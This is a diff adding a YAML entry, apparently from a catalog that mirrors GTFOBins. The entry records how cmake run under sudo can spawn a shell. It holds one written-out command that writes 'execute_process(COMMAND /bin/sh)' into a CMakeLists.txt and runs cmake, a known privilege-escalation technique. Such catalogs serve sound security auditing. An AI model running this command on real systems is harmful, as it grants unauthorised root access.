@@ -1,0 +1,26 @@
+id: gtfobins/cmake/shell/sudo
+type: binary
+platform: linux
+name: cmake
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''execute_process(COMMAND /bin/sh)'' >/path/to/CMakeLists.txt
+
+    cmake /path/to/'
+references:
+- https://gtfobins.github.io/gtfobins/cmake/
+tags:
+- linux
+- unix
+- gtfobins
